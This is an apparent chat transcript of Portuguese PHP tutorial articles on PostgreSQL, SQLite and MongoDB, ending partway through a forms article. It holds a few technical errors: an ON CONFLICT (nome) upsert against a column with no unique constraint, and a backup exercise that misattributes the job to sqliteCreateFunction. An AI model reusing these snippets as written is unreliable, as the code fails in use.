**MongoDB:** não foi coberto ainda. No roteiro original está no Módulo 4 (artigos 20–27). Pelos HTMLs gerados, o Módulo 4 cobriu MySQL/PDO (20), Query Builder/Migrations (21) e Eloquent/ORM (22) — PostgreSQL, SQLite e MongoDB ficaram de fora.

**Proposta para realinhar:**

Retomar o roteiro original a partir do artigo 31, cobrindo o que ficou pendente e seguindo em frente. Modo texto apenas, HTML no final.

Confirma que quer seguir assim?

Ótimo, já sei o que fazer. Vou colocar o roteiro na frente e começar agora — só textos, HTML no final.

---

## Roteiro daqui em diante — Módulo 4 (pendentes) + continuação

**Artigos pendentes do Módulo 4:**
- **Artigo 31** — PostgreSQL com PHP (PDO, tipos nativos, arrays, JSONB)
- **Artigo 32** — SQLite com PHP (casos de uso, embedded, testes)
- **Artigo 33** — MongoDB com PHP (documentos, coleções, driver oficial, queries)

**Módulo 5 — Web com PHP:**
- **Artigo 34** — Formulários HTML e PHP ($\_POST, $\_GET, validação)
- **Artigo 35** — Sessions e Cookies
- **Artigo 36** — Upload de arquivos
- **Artigo 37** — Segurança em formulários (XSS, CSRF, SQL Injection)

**Módulo 6 — PHP Moderno:**
- **Artigo 38** — Composer e Namespaces
- **Artigo 39** — PSR e padrões de código
- **Artigo 40** — Boas práticas e código limpo

**Módulo 7 — Laravel:**
- **Artigos 41–46**

**Módulo 8 — APIs REST:** 47–49
**Módulo 9 — Segurança:** 50–51
**Módulo 10 — Testes:** 52 (Projeto Final)

---

# Artigo 31 — PostgreSQL com PHP

**Módulo 4 · Semana 31 · Nível: Intermediário**

---

## Introdução

O MySQL é o banco de dados mais comum no ecossistema PHP, mas o PostgreSQL é o mais poderoso. Enquanto o MySQL foi por muito tempo otimizado para leitura rápida e simplicidade, o PostgreSQL nasceu com foco em conformidade com o padrão SQL, integridade de dados e recursos avançados que outros bancos levaram anos para implementar — ou nunca implementaram.

Neste artigo vamos conectar o PHP ao PostgreSQL usando PDO, explorar os tipos de dados nativos do Postgres que não existem no MySQL, trabalhar com JSONB para dados semiestruturados e entender quando faz sentido escolher o PostgreSQL em vez do MySQL.

---

## Por que PostgreSQL?

O PostgreSQL, frequentemente chamado apenas de "Postgres", é um sistema de banco de dados relacional de código aberto com mais de 35 anos de desenvolvimento ativo. Algumas vantagens concretas sobre o MySQL:

**Tipos de dados ricos.** O Postgres suporta arrays nativos, tipos geométricos (ponto, linha, polígono), ranges (intervalo de datas, de inteiros), tipos de rede (inet, cidr), e o JSONB — uma versão indexável e eficiente do JSON. O MySQL tem JSON desde 2015, mas a implementação do Postgres é significativamente mais poderosa.

**Conformidade com SQL.** O Postgres implementa o padrão SQL de forma muito mais completa, incluindo Common Table Expressions (CTEs) recursivos, window functions avançadas, e suporte a transações DDL (você pode fazer rollback de um `CREATE TABLE`, por exemplo).

**Extensibilidade.** O Postgres permite criar seus próprios tipos de dados, operadores e funções. Extensions como PostGIS (para dados geográficos), pgvector (para embeddings de IA), e TimescaleDB (para séries temporais) transformam o Postgres em um banco especializado quando necessário.

**Confiabilidade.** O Postgres tem reputação sólida de nunca perder dados. Seu sistema MVCC (Multi-Version Concurrency Control) é robusto e bem testado.

---

## Instalação e configuração

**No Linux (Ubuntu/Debian):**

```bash
sudo apt install postgresql postgresql-contrib php-pgsql
sudo systemctl start postgresql
```

**Criar banco e usuário:**

```bash
sudo -u postgres psql

-- Dentro do psql:
CREATE DATABASE loja;
CREATE USER app_user WITH PASSWORD 'senha123';
GRANT ALL PRIVILEGES ON DATABASE loja TO app_user;
\q
```

**Verificar conexão:**

```bash
psql -h localhost -U app_user -d loja
```

---

## Conectando com PDO

A beleza do PDO é que a mudança de MySQL para PostgreSQL exige apenas trocar o DSN. O resto do código permanece idêntico:

```php
<?php
declare(strict_types=1);

// MySQL seria: mysql:host=localhost;dbname=loja;charset=utf8mb4
$dsn = 'pgsql:host=localhost;port=5432;dbname=loja';

try {
    $pdo = new PDO(
        dsn:      $dsn,
        username: 'app_user',
        password: 'senha123',
        options:  [
            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES   => false,
        ]
    );

    echo "Conectado ao PostgreSQL com sucesso!\n";

} catch (PDOException $e) {
    throw new RuntimeException(
        "Falha na conexão: " . $e->getMessage()
    );
}
```

Note o `PDO::ATTR_EMULATE_PREPARES => false`. No PostgreSQL, isso é especialmente importante: garante que o PDO use prepared statements reais do servidor, o que melhora performance e segurança. O Postgres tem um cache interno de planos de execução para prepared statements, e desativar a emulação permite que esse cache seja utilizado.

---

## Criando o schema

```php
<?php

$pdo->exec("
    CREATE TABLE IF NOT EXISTS produtos (
        id          SERIAL PRIMARY KEY,
        nome        VARCHAR(200)    NOT NULL,
        preco       NUMERIC(10, 2)  NOT NULL CHECK (preco >= 0),
        estoque     INTEGER         NOT NULL DEFAULT 0,
        ativo       BOOLEAN         NOT NULL DEFAULT TRUE,
        tags        TEXT[],
        metadata    JSONB,
        criado_em   TIMESTAMPTZ     NOT NULL DEFAULT NOW()
    )
");
```

Observe alguns tipos específicos do PostgreSQL:
- `SERIAL`: auto-incremento (equivalente a `AUTO_INCREMENT` do MySQL). No Postgres moderno, prefere-se `GENERATED ALWAYS AS IDENTITY`, mas `SERIAL` ainda é amplamente usado.
- `NUMERIC(10, 2)`: tipo exato para dinheiro, sem erros de ponto flutuante.
- `BOOLEAN`: tipo nativo no Postgres (no MySQL é `TINYINT(1)`).
- `TEXT[]`: array de strings.
- `JSONB`: JSON armazenado em formato binário, indexável.
- `TIMESTAMPTZ`: timestamp com timezone (melhor prática para aplicações multi-fuso).

---

## Arrays nativos

```php
<?php

// Inserindo um produto com array de tags
$stmt = $pdo->prepare("
    INSERT INTO produtos (nome, preco, estoque, tags)
    VALUES (:nome, :preco, :estoque, :tags)
    RETURNING id, criado_em
");

// Arrays são passados como strings no formato do Postgres
$stmt->execute([
    ':nome'    => 'Teclado Mecânico',
    ':preco'   => '299.90',
    ':estoque' => 15,
    ':tags'    => '{periférico,teclado,mecânico}',
]);

$resultado = $stmt->fetch();
echo "Produto criado com ID: {$resultado['id']}\n";
echo "Criado em: {$resultado['criado_em']}\n";

// Note o RETURNING — permite retornar dados da linha inserida
// sem fazer um SELECT separado. O MySQL não tem isso.

// Consultando e decodificando o array
$stmt = $pdo->prepare("SELECT nome, tags FROM produtos WHERE id = :id");
$stmt->execute([':id' => $resultado['id']]);
$produto = $stmt->fetch();

// O PDO retorna o array como string: {periférico,teclado,mecânico}
// Precisamos fazer o parse manualmente
$tags = str_getcsv(trim($produto['tags'], '{}'));
print_r($tags); // ['periférico', 'teclado', 'mecânico']

// Buscar produtos que contenham uma tag específica
$stmt = $pdo->prepare("
    SELECT nome, tags
    FROM produtos
    WHERE :tag = ANY(tags)
");
$stmt->execute([':tag' => 'mecânico']);
```

---

## JSONB — JSON indexável

O JSONB é um dos recursos mais poderosos do PostgreSQL. Diferente do tipo JSON simples (que armazena o texto original), o JSONB armazena em formato binário parseado, permitindo indexação e consultas eficientes:

```php
<?php

// Inserindo com JSONB
$metadata = json_encode([
    'fabricante' => 'Keychron',
    'switch'     => 'Brown',
    'bluetooth'  => true,
    'dimensoes'  => ['largura' => 36, 'altura' => 13, 'profundidade' => 12],
    'cores'      => ['preto', 'cinza'],
]);

$stmt = $pdo->prepare("
    UPDATE produtos
    SET metadata = :metadata::jsonb
    WHERE id = :id
");
$stmt->execute([':metadata' => $metadata, ':id' => 1]);

// Consultando campos específicos do JSONB com operador ->
$stmt = $pdo->query("
    SELECT
        nome,
        metadata->>'fabricante'        AS fabricante,
        metadata->>'switch'            AS switch,
        (metadata->>'bluetooth')::bool AS bluetooth,
        metadata->'dimensoes'->>'largura' AS largura
    FROM produtos
    WHERE metadata->>'fabricante' = 'Keychron'
      AND (metadata->>'bluetooth')::bool = true
");

while ($row = $stmt->fetch()) {
    echo "{$row['nome']} — {$row['fabricante']}, switch {$row['switch']}\n";
}

// Criando índice GIN para consultas JSONB eficientes
$pdo->exec("CREATE INDEX idx_produtos_metadata ON produtos USING gin(metadata)");

// Com o índice, consultas usando @> (contém) são muito eficientes:
$stmt = $pdo->prepare("
    SELECT nome FROM produtos
    WHERE metadata @> :filtro::jsonb
");
$stmt->execute([':filtro' => json_encode(['bluetooth' => true])]);
```

---

## Transações e recursos avançados

```php
<?php

// CTEs (Common Table Expressions) — disponíveis no MySQL 8+
// mas muito mais comuns e idiomáticas no PostgreSQL
$stmt = $pdo->query("
    WITH
    produtos_ativos AS (
        SELECT id, nome, preco, estoque
        FROM produtos
        WHERE ativo = true AND estoque > 0
    ),
    estatisticas AS (
        SELECT
            COUNT(*)            AS total,
            AVG(preco)          AS preco_medio,
            SUM(estoque)        AS estoque_total
        FROM produtos_ativos
    )
    SELECT p.nome, p.preco, e.preco_medio
    FROM produtos_ativos p, estatisticas e
    ORDER BY p.preco DESC
    LIMIT 10
");

// UPSERT nativo com ON CONFLICT
$stmt = $pdo->prepare("
    INSERT INTO produtos (nome, preco, estoque)
    VALUES (:nome, :preco, :estoque)
    ON CONFLICT (nome)
    DO UPDATE SET
        preco    = EXCLUDED.preco,
        estoque  = EXCLUDED.estoque,
        ativo    = true
    RETURNING id, (xmax = 0) AS inserido
");
// xmax = 0 indica que foi um INSERT; xmax != 0 indica UPDATE
```

---

## Quando usar PostgreSQL vs MySQL

| Critério | PostgreSQL | MySQL |
|---|---|---|
| Consultas complexas | ✅ Excelente | ✅ Bom |
| Dados geográficos (PostGIS) | ✅ Referência | ❌ Limitado |
| JSONB/documentos híbridos | ✅ Excelente | ⚠️ Funcional |
| Performance de leitura simples | ✅ Ótimo | ✅ Ótimo |
| Ecossistema WordPress/legado | ⚠️ Menor | ✅ Dominante |
| Hospedagem compartilhada | ⚠️ Menos disponível | ✅ Ubíquo |
| Conformidade SQL | ✅ Excelente | ⚠️ Parcial |

---

## Exercício da semana

1. Instale o PostgreSQL localmente e conecte via PDO. Crie um banco `biblioteca` com tabela `livros` (id, titulo, autores TEXT[], generos TEXT[], metadata JSONB, publicado_em DATE).

2. Insira 5 livros com arrays de autores e metadados JSON (editora, ISBN, numero_paginas). Use `RETURNING` para capturar o `id` gerado.

3. Escreva uma query que use `ANY()` para buscar livros de um determinado gênero. Depois, use `@>` para buscar pelo JSONB (ex: todos da editora "Companhia das Letras").

4. Implemente um UPSERT: se o livro (pelo ISBN no JSONB) já existir, atualize o preço; caso contrário, insira.

5. **Desafio:** crie um índice GIN no campo `generos` (array) e no campo `metadata` (JSONB). Use `EXPLAIN ANALYZE` para comparar o custo das queries com e sem índice.

---

## Referências

- Documentação oficial do PostgreSQL: https://www.postgresql.org/docs/
- PHP Manual — PDO_PGSQL: https://www.php.net/manual/pt_BR/ref.pdo-pgsql.php
- PostgreSQL vs MySQL — comparação técnica detalhada: https://www.postgresql.org/about/featurematrix/
- JSONB no PostgreSQL — guia completo: https://www.postgresql.org/docs/current/datatype-json.html

---

# Artigo 32 — SQLite com PHP

**Módulo 4 · Semana 32 · Nível: Intermediário**

---

## Introdução

SQLite é o banco de dados mais instalado do mundo — está presente em todos os smartphones Android e iPhone, em todos os navegadores, no sistema operacional macOS, em centenas de milhões de dispositivos embarcados. Mas na web com PHP, é frequentemente ignorado ou mal compreendido.

SQLite não é um banco de dados "de brinquedo". É uma escolha deliberada e poderosa para cenários específicos: aplicações de pequeno a médio porte com tráfego moderado, ferramentas de linha de comando, ambientes de teste, cache local, e qualquer situação onde você não queira (ou não possa) manter um servidor de banco de dados separado.

---

## O que é o SQLite e como ele funciona

Ao contrário do MySQL e PostgreSQL, que são sistemas cliente-servidor, o SQLite é uma biblioteca que se incorpora diretamente à sua aplicação. O banco de dados inteiro é um único arquivo em disco. Não há servidor para iniciar, não há configuração de usuários e senhas, não há processo separado.

Isso traz consequências importantes:

**Vantagens:** zero configuração, portabilidade total (copie o arquivo e leve o banco junto), perfeito para desenvolvimento e testes, funciona em qualquer hospedagem sem dependências externas.

**Limitações:** escritas concorrentes são serialized (apenas uma escrita por vez, embora o WAL mode melhore isso), não é adequado para aplicações com alta concorrência de escrita, não suporta alguns tipos de dados avançados.

---

## Criando e conectando ao banco

```php
<?php
declare(strict_types=1);

// O banco é criado automaticamente se não existir
// Use :memory: para um banco em memória (ideal para testes)
$pdo = new PDO('sqlite:banco.db', options: [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
]);

// Ativar WAL mode: melhora performance de leitura concorrente
$pdo->exec('PRAGMA journal_mode = WAL');

// Ativar foreign keys (desativado por padrão no SQLite!)
$pdo->exec('PRAGMA foreign_keys = ON');

// Ajustar tamanho do cache
$pdo->exec('PRAGMA cache_size = -64000'); // 64MB

echo "SQLite " . $pdo->query('SELECT sqlite_version()')->fetchColumn() . "\n";
```

O detalhe do `PRAGMA foreign_keys = ON` é crítico e frequentemente esquecido. Por padrão, o SQLite não verifica integridade referencial — chaves estrangeiras são aceitas mas não validadas. Sempre ative esse pragma na abertura da conexão.

---

## Schema e tipos de dados

O SQLite usa um sistema de tipos chamado "type affinity" — diferente de outros bancos, ele é bastante flexível (você pode inserir um texto numa coluna `INTEGER`). Na prática, use os tipos normalmente e o SQLite fará o melhor:

```php
<?php

$pdo->exec("
    CREATE TABLE IF NOT EXISTS notas (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        titulo      TEXT    NOT NULL,
        conteudo    TEXT,
        criada_em   TEXT    NOT NULL DEFAULT (datetime('now')),
        atualizada_em TEXT,
        arquivada   INTEGER NOT NULL DEFAULT 0  -- 0 = false, 1 = true
    )
");

$pdo->exec("
    CREATE TABLE IF NOT EXISTS tags (
        id   INTEGER PRIMARY KEY AUTOINCREMENT,
        nome TEXT NOT NULL UNIQUE
    )
");

$pdo->exec("
    CREATE TABLE IF NOT EXISTS notas_tags (
        nota_id INTEGER NOT NULL REFERENCES notas(id) ON DELETE CASCADE,
        tag_id  INTEGER NOT NULL REFERENCES tags(id)  ON DELETE CASCADE,
        PRIMARY KEY (nota_id, tag_id)
    )
");

// Índice para busca por texto
$pdo->exec("CREATE INDEX IF NOT EXISTS idx_notas_titulo ON notas(titulo)");
```

---

## Full-Text Search — busca de texto com FTS5

Uma das joias do SQLite é o módulo FTS5 (Full-Text Search version 5), que permite busca textual eficiente sem precisar de Elasticsearch ou Typesense para casos simples:

```php
<?php

// Criando tabela virtual de FTS
$pdo->exec("
    CREATE VIRTUAL TABLE IF NOT EXISTS notas_fts
    USING fts5(titulo, conteudo, content='notas', content_rowid='id')
");

// Trigger para manter o índice atualizado
$pdo->exec("
    CREATE TRIGGER IF NOT EXISTS notas_fts_insert
    AFTER INSERT ON notas BEGIN
        INSERT INTO notas_fts(rowid, titulo, conteudo)
        VALUES (new.id, new.titulo, new.conteudo);
    END
");

$pdo->exec("
    CREATE TRIGGER IF NOT EXISTS notas_fts_delete
    AFTER DELETE ON notas BEGIN
        INSERT INTO notas_fts(notas_fts, rowid, titulo, conteudo)
        VALUES ('delete', old.id, old.titulo, old.conteudo);
    END
");

// Inserindo e buscando
$pdo->prepare("INSERT INTO notas (titulo, conteudo) VALUES (?, ?)")
    ->execute(['PHP e SQLite', 'SQLite é excelente para aplicações PHP de médio porte']);

$pdo->prepare("INSERT INTO notas (titulo, conteudo) VALUES (?, ?)")
    ->execute(['PostgreSQL avançado', 'JSONB e arrays nativos tornam o Postgres poderoso']);

// Busca FTS com ranking por relevância
$stmt = $pdo->prepare("
    SELECT n.id, n.titulo, n.conteudo,
           bm25(notas_fts) AS relevancia
    FROM notas_fts
    JOIN notas n ON n.id = notas_fts.rowid
    WHERE notas_fts MATCH :termo
    ORDER BY relevancia
    LIMIT 10
");
$stmt->execute([':termo' => 'PHP SQLite']);
$resultados = $stmt->fetchAll();
```

---

## SQLite para testes — o caso de uso mais valioso

O uso mais poderoso do SQLite em projetos profissionais é como banco de dados para testes automatizados. Em vez de criar um banco MySQL real para os testes (lento, com estado compartilhado entre execuções), use SQLite em memória:

```php
<?php

// Em um TestCase base (PHPUnit)
abstract class DatabaseTestCase extends TestCase
{
    protected PDO $pdo;

    protected function setUp(): void
    {
        // Banco em memória: criado do zero a cada teste, destruído ao final
        $this->pdo = new PDO('sqlite::memory:', options: [
            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]);
        $this->pdo->exec('PRAGMA foreign_keys = ON');
        $this->migrarSchema();
        $this->inserirDadosDeFixture();
    }

    private function migrarSchema(): void
    {
        // Roda as mesmas migrations do projeto — garantindo paridade
        $sql = file_get_contents(__DIR__ . '/../schema.sql');
        $this->pdo->exec($sql);
    }

    private function inserirDadosDeFixture(): void
    {
        $this->pdo->exec("
            INSERT INTO usuarios (nome, email) VALUES
            ('Alice', 'alice@teste.com'),
            ('Bob', 'bob@teste.com')
        ");
    }
}

class UsuarioRepositorioTest extends DatabaseTestCase
{
    public function test_buscar_por_email_retorna_usuario_existente(): void
    {
        $repo = new UsuarioRepositorio($this->pdo);
        $usuario = $repo->buscarPorEmail('alice@teste.com');

        $this->assertNotNull($usuario);
        $this->assertSame('Alice', $usuario->nome);
    }

    public function test_buscar_por_email_retorna_null_para_inexistente(): void
    {
        $repo = new UsuarioRepositorio($this->pdo);
        $usuario = $repo->buscarPorEmail('inexistente@teste.com');

        $this->assertNull($usuario);
    }
}
```

Cada teste começa com um banco limpo, sem afetar outros testes. Muito mais rápido que MySQL ou PostgreSQL em memória real.

---

## Resumo

| Característica | SQLite |
|---|---|
| Configuração | Zero — um arquivo |
| Concorrência de escrita | Limitada (WAL mode ajuda) |
| Full-Text Search | FTS5 nativo e eficiente |
| Testes automatizados | Ideal — banco em `:memory:` |
| Portabilidade | Total — o arquivo é o banco |
| Foreign keys | Desativadas por padrão — sempre ative |

---

## Exercício da semana

1. Crie uma aplicação de notas pessoais com SQLite: CRUD completo (criar, listar, editar, arquivar, deletar) com tags. Use `PRAGMA foreign_keys = ON` e WAL mode.

2. Implemente FTS5 na tabela de notas. Escreva uma função `buscar(string $termo): array` que use `MATCH` e retorne resultados ordenados por relevância (`bm25`).

3. Implemente a mesma aplicação usando MySQL (ou PostgreSQL). Crie uma interface `NotaRepositorioInterface` que ambas as implementações satisfaçam. Escreva testes que rodem contra SQLite `:memory:` mas garantam que o código funciona.

4. **Desafio:** implemente backup automático do SQLite: uma função `backup(string $destinoPath): void` que usa a [API de backup do SQLite](https://www.sqlite.org/backup.html) via `$pdo->sqliteCreateFunction()` ou via linha de comando `.dump`.

---

## Referências

- Documentação oficial do SQLite: https://www.sqlite.org/docs.html
- SQLite FTS5: https://www.sqlite.org/fts5.html
- PHP Manual — PDO_SQLite: https://www.php.net/manual/pt_BR/ref.pdo-sqlite.php
- Artigo "Consider SQLite" de Ben Johnson: https://litestream.io/alternatives/

---

# Artigo 33 — MongoDB com PHP

**Módulo 4 · Semana 33 · Nível: Intermediário**

---

## Introdução

MongoDB representa uma abordagem radicalmente diferente ao armazenamento de dados. Enquanto bancos relacionais organizam dados em tabelas com linhas e colunas de schema fixo, o MongoDB organiza dados em **coleções de documentos** no formato BSON (Binary JSON), sem schema obrigatório. Cada documento pode ter campos diferentes dos demais na mesma coleção.

Isso não significa que o MongoDB é "melhor" que o MySQL — é diferente. Ele brilha em cenários específicos: dados com estrutura variável ou que mudam com frequência, catálogos de produtos com atributos heterogêneos, logs e eventos, e aplicações onde a estrutura de dados evolui rápido. Entender quando usá-lo (e quando não usá-lo) é tão importante quanto saber usá-lo.

---

## Instalação

**MongoDB no Linux:**

```bash
# Instalar MongoDB
sudo apt install mongodb-org

# Instalar a extensão PHP
sudo pecl install mongodb
echo "extension=mongodb.so" | sudo tee -a /etc/php/8.x/cli/php.ini

# Instalar a biblioteca via Composer
composer require mongodb/mongodb
```

---

## Conceitos fundamentais

Antes de escrever código, alinhe o vocabulário:

| Relacional | MongoDB |
|---|---|
| Banco de dados | Database |
| Tabela | Collection |
| Linha | Document |
| Coluna | Field |
| JOIN | $lookup (aggregation) |
| PRIMARY KEY | _id (ObjectId automático) |
| INDEX | Index (mesma ideia) |
| Schema fixo | Schema flexível |

---

## Conexão e operações básicas

```php
<?php
declare(strict_types=1);

require 'vendor/autoload.php';

use MongoDB\Client;
use MongoDB\BSON\ObjectId;
use MongoDB\BSON\UTCDateTime;

$client = new Client('mongodb://localhost:27017');

// Seleciona o banco e a coleção
// Se não existirem, são criados automaticamente na primeira operação
$db       = $client->loja;
$produtos = $db->produtos;

// INSERT — insertOne() retorna InsertOneResult
$resultado = $produtos->insertOne([
    'nome'       => 'Teclado Mecânico Keychron K2',
    'preco'      => 299.90,
    'estoque'    => 15,
    'ativo'      => true,
    'tags'       => ['periférico', 'teclado', 'mecânico'],
    'fabricante' => [           // documento embutido (embedded document)
        'nome'    => 'Keychron',
        'pais'    => 'China',
        'site'    => 'keychron.com',
    ],
    'variacoes' => [            // array de documentos embutidos
        ['cor' => 'preto',  'sku' => 'K2-BLK', 'estoque' => 8],
        ['cor' => 'cinza',  'sku' => 'K2-GRY', 'estoque' => 7],
    ],
    'criado_em'  => new UTCDateTime(),
]);

$id = $resultado->getInsertedId(); // ObjectId
echo "Inserido com ID: {$id}\n";

// INSERT em lote — insertMany()
$produtos->insertMany([
    ['nome' => 'Mouse Logitech MX Master 3', 'preco' => 499.90, 'tags' => ['periférico', 'mouse']],
    ['nome' => 'Monitor LG 27" 4K',          'preco' => 2899.00, 'tags' => ['monitor', 'display']],
]);
```

---

## Consultas — find e findOne

```php
<?php

// findOne() retorna um documento ou null
$produto = $produtos->findOne(['nome' => 'Teclado Mecânico Keychron K2']);
echo $produto['nome'] . ": R$ " . $produto['preco'] . "\n";

// Acessando documento embutido
echo "Fabricante: " . $produto['fabricante']['nome'] . "\n";

// find() retorna um Cursor — itere normalmente
$cursor = $produtos->find(['ativo' => true]);
foreach ($cursor as $p) {
    echo "- {$p['nome']}: R$ {$p['preco']}\n";
}

// Operadores de comparação
$caros = $produtos->find([
    'preco' => ['$gte' => 500],   // maior ou igual a 500
    'ativo' => true,
]);

// Múltiplas condições — AND implícito
$cursor = $produtos->find([
    'preco'   => ['$gte' => 100, '$lte' => 1000],
    'estoque' => ['$gt' => 0],
]);

// OR explícito
$cursor = $produtos->find([
    '$or' => [
        ['tags' => 'teclado'],
        ['tags' => 'mouse'],
    ]
]);

// Busca em array — o MongoDB verifica se o array contém o valor
$cursor = $produtos->find(['tags' => 'mecânico']);

// Busca em documento embutido com notação de ponto
$cursor = $produtos->find(['fabricante.nome' => 'Keychron']);

// Projeção — escolher quais campos retornar (1 = incluir, 0 = excluir)
$cursor = $produtos->find(
    filter:  ['ativo' => true],
    options: [
        'projection' => ['nome' => 1, 'preco' => 1, '_id' => 0],
        'sort'       => ['preco' => -1],   // -1 = decrescente
        'limit'      => 10,
        'skip'       => 0,
    ]
);
```

---

## Atualização e deleção

```php
<?php

// updateOne() — atualiza o primeiro documento que corresponde ao filtro
$produtos->updateOne(
    ['_id' => new ObjectId($id)],
    ['$set' => ['preco' => 279.90, 'atualizado_em' => new UTCDateTime()]]
);

// $inc — incrementa um valor
$produtos->updateOne(
    ['_id' => new ObjectId($id)],
    ['$inc' => ['estoque' => -1]]   // decrementa estoque em 1
);

// $push — adiciona ao array
$produtos->updateOne(
    ['_id' => new ObjectId($id)],
    ['$push' => ['tags' => 'bluetooth']]
);

// $pull — remove do array
$produtos->updateOne(
    ['_id' => new ObjectId($id)],
    ['$pull' => ['tags' => 'bluetooth']]
);

// updateMany() — atualiza todos que correspondem
$produtos->updateMany(
    ['estoque' => 0],
    ['$set' => ['ativo' => false]]
);

// findOneAndUpdate() — atualiza e retorna o documento
$atualizado = $produtos->findOneAndUpdate(
    ['sku' => 'K2-BLK'],
    ['$inc' => ['estoque' => -1]],
    ['returnDocument' => \MongoDB\Operation\FindOneAndUpdate::RETURN_DOCUMENT_AFTER]
);

// deleteOne() e deleteMany()
$produtos->deleteOne(['_id' => new ObjectId($id)]);
$produtos->deleteMany(['ativo' => false, 'estoque' => 0]);
```

---

## Aggregation Pipeline — o poder do MongoDB

O framework de agregação do MongoDB é equivalente a GROUP BY, JOIN e funções de janela do SQL, mas com uma sintaxe de pipeline:

```php
<?php

$pipeline = [
    // $match — filtra documentos (como WHERE)
    ['$match' => ['ativo' => true]],

    // $unwind — "explode" um array em documentos separados
    ['$unwind' => '$tags'],

    // $group — agrupa e acumula (como GROUP BY)
    ['$group' => [
        '_id'           => '$tags',
        'total_produtos'=> ['$sum' => 1],
        'preco_medio'   => ['$avg' => '$preco'],
        'preco_min'     => ['$min' => '$preco'],
        'preco_max'     => ['$max' => '$preco'],
    ]],

    // $sort — ordena o resultado
    ['$sort' => ['total_produtos' => -1]],

    // $limit
    ['$limit' => 10],
];

$resultado = $produtos->aggregate($pipeline);
foreach ($resultado as $item) {
    echo "Tag: {$item['_id']}, Produtos: {$item['total_produtos']}, "
       . "Preço médio: R$ " . number_format($item['preco_medio'], 2, ',', '.') . "\n";
}
```

---

## Índices

```php
<?php

// Índice simples
$produtos->createIndex(['nome' => 1]);

// Índice composto
$produtos->createIndex(['ativo' => 1, 'preco' => -1]);

// Índice de texto para busca full-text
$produtos->createIndex(['nome' => 'text', 'descricao' => 'text']);

// Busca textual
$cursor = $produtos->find(['$text' => ['$search' => 'teclado mecânico']]);

// Índice em campo de documento embutido
$produtos->createIndex(['fabricante.nome' => 1]);

// TTL index — documentos expiram automaticamente (ótimo para logs/sessões)
$db->sessoes->createIndex(
    ['criado_em' => 1],
    ['expireAfterSeconds' => 3600]  // expira após 1 hora
);
```

---

## Quando usar MongoDB vs banco relacional

| Use MongoDB quando... | Use banco relacional quando... |
|---|---|
| Schema varia entre documentos | Schema é bem definido e estável |
| Dados hierárquicos naturais | Dados com muitos relacionamentos |
| Escrita e leitura em alta escala | Consistência ACID é crítica |
| Prototipagem rápida | Relatórios complexos e JOINs |
| Catálogos com atributos variáveis | Transações financeiras |

---

## Exercício da semana

1. Crie uma coleção `artigos` de um blog: título, conteúdo, autor (documento embutido com nome e email), tags (array), publicado_em, rascunho (boolean). Insira 5 artigos.

2. Escreva queries para: buscar todos os artigos publicados de um autor específico, buscar artigos por tag, buscar artigos com mais de 500 palavras no conteúdo (usando `$where` com `$expr`).

3. Crie um pipeline de agregação que retorne: por autor, o número de artigos publicados, a data do artigo mais recente e as 3 tags mais usadas.

4. Implemente um TTL index na coleção `tokens_recuperacao` onde cada token expira em 2 horas (`expireAfterSeconds: 7200`).

5. **Desafio:** implemente um `ArticleRepository` com interface idêntica ao `ArticleRepositoryPDO` que usa bancos relacionais. Ambos devem implementar `ArticleRepositoryInterface`. Escreva testes que rodem contra ambas as implementações.

---

## Referências

- Documentação oficial MongoDB: https://www.mongodb.com/docs/
- Driver PHP oficial: https://www.mongodb.com/docs/drivers/php/
- Biblioteca PHP MongoDB no Packagist: https://packagist.org/packages/mongodb/mongodb
- MongoDB University (cursos gratuitos): https://learn.mongodb.com/

---

Três artigos completos, só em texto, seguindo o roteiro original. **Módulo 4 agora completo** (artigos 20–33).

Próximos: **Módulo 5 — Web com PHP** (formulários, sessions, cookies, upload, segurança em formulários). Continuo?

---

# you asked

message time: 2026-03-10 08:23:04

Continue

---

# claude response

# Artigo 34 — Formulários HTML e PHP

**Módulo 5 · Semana 34 · Nível: Intermediário**

---

## Introdução

Formulários são a porta de entrada dos dados do usuário para o servidor. Tudo que um sistema web faz de significativo — login, cadastro, busca, compra, envio de mensagem — passa por um formulário. Saber processar formulários com segurança e corretamente é uma das habilidades mais fundamentais do desenvolvimento web com PHP.

Neste artigo cobrimos o ciclo completo: como o navegador envia dados, como o PHP os recebe, como validar com rigor e como dar feedback útil ao usuário — tudo sem framework, para que você entenda o que acontece por baixo.

---

## Como os dados chegam ao PHP

Quando um usuário submete um formulário HTML, o navegador empacota os dados e os envia para o servidor via HTTP. O método do envio determina como os dados chegam:

**GET** — os dados vão na URL, como query string: `?nome=Alice&idade=30`. Visíveis, limitados em tamanho (~2000 caracteres), não adequados para dados sensíveis. Use para buscas e filtros.

**POST** — os dados vão no corpo da requisição HTTP, invisíveis na URL. Sem limite prático de tamanho (configurável). Use para envio de dados, login, cadastro.

No PHP, os dados chegam em superglobais:

```php
<?php
// Dados enviados por GET (query string)
$nome = $_GET['nome'] ?? '';

// Dados enviados por POST (corpo da requisição)
$email = $_POST['email'] ?? '';

// $_REQUEST contém GET + POST + COOKIE — evite, é ambíguo
```

---

## Formulário simples — ciclo completo

```php
<?php
declare(strict_types=1);

// O mesmo arquivo processa o formulário e o exibe
// Técnica "Post/Redirect/Get" — veremos adiante

$erros  = [];
$sucesso = false;
$dados  = ['nome' => '', 'email' => '', 'mensagem' => ''];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Lê os dados com trim() para remover espaços acidentais
    $dados['nome']     = trim($_POST['nome']     ?? '');
    $dados['email']    = trim($_POST['email']    ?? '');
    $dados['mensagem'] = trim($_POST['mensagem'] ?? '');

    // Validação
    if ($dados['nome'] === '') {
        $erros['nome'] = 'O nome é obrigatório.';
    } elseif (strlen($dados['nome']) < 2) {
        $erros['nome'] = 'O nome deve ter pelo menos 2 caracteres.';
    } elseif (strlen($dados['nome']) > 100) {
        $erros['nome'] = 'O nome deve ter no máximo 100 caracteres.';
    }

    if ($dados['email'] === '') {
        $erros['email'] = 'O email é obrigatório.';
    } elseif (!filter_var($dados['email'], FILTER_VALIDATE_EMAIL)) {
        $erros['email'] = 'Informe um email válido.';
    }

    if ($dados['mensagem'] === '') {
